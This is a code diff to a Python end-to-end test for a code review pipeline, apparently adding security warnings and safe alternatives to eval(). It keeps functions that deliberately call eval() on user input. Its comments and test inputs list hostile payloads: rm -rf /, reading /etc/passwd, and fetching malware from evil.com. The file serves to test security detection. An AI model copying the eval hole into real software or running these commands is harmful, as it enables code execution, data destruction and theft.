@@ -4,11 +4,21 @@ Realistic Code Review Pipeline E2E Test
 This test demonstrates a realistic end-to-end workflow for a code review system
 that includes code analysis, validation, human-in-the-loop approval, and error handling.
 
-SECURITY WARNING:
+🔒 SECURITY WARNING - CRITICAL:
 This test file intentionally includes dangerous code patterns (eval(), exec(), etc.)
 for demonstration purposes to test security analysis capabilities. These patterns are
 NEVER safe to use in production code and are included here solely for testing the
 code review pipeline's ability to detect security vulnerabilities.
+
+⚠️  DANGEROUS PATTERNS IN THIS FILE:
+- eval() with user input (lines 311-313, 370)
+- These are intentionally dangerous for security testing only
+
+✅ SAFE ALTERNATIVES FOR PRODUCTION:
+- Use ast.literal_eval() for safe literal evaluation
+- Implement proper input validation and sanitization
+- Use type checking and validation libraries
+- Never execute user input directly
 
 In production code:
 - NEVER use eval() with user input
@@ -16,6 +26,7 @@ In production code:
 - Always validate and sanitize all user inputs
 - Use ast.literal_eval() for safe literal evaluation
 - Implement proper input validation and sanitization
+- Use secure alternatives like json.loads() for JSON parsing
 """
 
 import pytest
@@ -311,7 +322,9 @@ def bad_function():
     user_input = input("Enter command: ")
     # WARNING: This eval() usage is intentionally dangerous for testing security analysis
     # This demonstrates what NOT to do in production code
-    result = eval(user_input)  # Dangerous!
+    # SECURITY RISK: eval() with user input is extremely dangerous
+    # In production, use ast.literal_eval() or proper input validation
+    result = eval(user_input)  # Dangerous! - Only for security testing
     print("Result:", result)
     return result
 
@@ -368,7 +381,9 @@ async def test_realistic_code_review_pipeline_with_failure_recovery():
         "code": """
 def problematic_function():
     # This code has issues that might cause analysis failures
-    result = eval("2 + 2")  # Dangerous eval
+    # SECURITY RISK: eval() is dangerous and should never be used in production
+    # This is intentionally dangerous code for security testing purposes only
+    result = eval("2 + 2")  # Dangerous eval - Only for security testing
     # E2E test: Use State Backend for persistent recording
     # WARNING: This test intentionally demonstrates dangerous eval() usage for security testing
     # This code uses eval, which is dangerous and can lead to security vulnerabilities.
@@ -471,3 +486,124 @@ def main():
     # Verify no critical errors in any step
     for step_result in result.step_history:
         assert step_result.success, f"Step {step_result.name} failed"
+
+
+# 🔒 SECURITY EXAMPLE: Safe alternatives to eval()
+def safe_input_handling_example():
+    """
+    Example of safe input handling - this is what you SHOULD do in production.
+
+    This demonstrates proper security practices as alternatives to dangerous eval() usage.
+    """
+    import ast
+    import json
+    from typing import Any
+
+    def safe_literal_eval(user_input: str) -> Any | None:
+        """
+        Safely evaluate user input as a Python literal.
+
+        This is a safe alternative to eval() for evaluating basic Python literals
+        like strings, numbers, lists, dictionaries, etc.
+        """
+        try:
+            # ast.literal_eval() only evaluates literals, not arbitrary expressions
+            result = ast.literal_eval(user_input)
+            print(f"✅ Safe evaluation result: {result}")
+            return result
+        except (ValueError, SyntaxError) as e:
+            print(f"❌ Invalid input: {e}")
+            return None
+
+    def safe_json_parsing(user_input: str) -> Any | None:
+        """
+        Safely parse JSON input from user.
+
+        This is another safe alternative for structured data.
+        """
+        try:
+            result = json.loads(user_input)
+            print(f"✅ Safe JSON parsing result: {result}")
+            return result
+        except json.JSONDecodeError as e:
+            print(f"❌ Invalid JSON: {e}")
+            return None
+
+    def validate_and_process_input(user_input: str) -> Any | None:
+        """
+        Comprehensive input validation and processing.
+
+        This demonstrates proper input validation before any processing.
+        """
+        # Step 1: Input validation
+        if not user_input or len(user_input) > 1000:
+            print("❌ Input too long or empty")
+            return None
+
+        # Step 2: Whitelist validation
+        allowed_patterns = [
+            r"^[0-9]+$",  # Numbers only
+            r'^"[^"]*"$',  # Quoted strings
+            r"^\[.*\]$",  # Lists
+            r"^\{.*\}$",  # Dictionaries
+        ]
+
+        import re
+
+        for pattern in allowed_patterns:
+            if re.match(pattern, user_input):
+                # Step 3: Safe evaluation
+                return safe_literal_eval(user_input)
+
+        print("❌ Input format not allowed")
+        return None
+
+    # Example usage
+    test_inputs = [
+        '"hello world"',  # Safe string
+        "42",  # Safe number
+        "[1, 2, 3]",  # Safe list
+        '{"key": "value"}',  # Safe dict
+        'os.system("rm -rf /")',  # Dangerous - should be rejected
+    ]
+
+    print("🔒 Safe Input Handling Examples:")
+    print("=" * 50)
+
+    for test_input in test_inputs:
+        print(f"\nTesting: {test_input}")
+        result = validate_and_process_input(test_input)
+        if result is not None:
+            print(f"✅ Accepted: {type(result).__name__} = {result}")
+        else:
+            print("❌ Rejected: Invalid or dangerous input")
+
+    return "Safe input handling demonstration completed"
+
+
+# Example of what NOT to do (for educational purposes only)
+def dangerous_eval_example():
+    """
+    ⚠️  DANGEROUS EXAMPLE - NEVER USE IN PRODUCTION!
+
+    This demonstrates what NOT to do with user input.
+    """
+    user_input = input("Enter command: ")
+    # ⚠️  DANGEROUS: eval() with user input can execute arbitrary code
+    # This could allow attackers to:
+    # - Delete files: os.system("rm -rf /")
+    # - Access system: __import__("os").system("whoami")
+    # - Steal data: open("/etc/passwd").read()
+    # - Install malware: __import__("urllib.request").urlopen("http://evil.com/malware")
+    result = eval(user_input)  # ⚠️  EXTREMELY DANGEROUS!
+    print("Result:", result)
+    return result
+
+
+if __name__ == "__main__":
+    # Demonstrate safe alternatives
+    safe_input_handling_example()
+
+    # ⚠️  WARNING: The following is intentionally dangerous for educational purposes
+    # Uncomment only in controlled testing environments
+    # dangerous_eval_example()
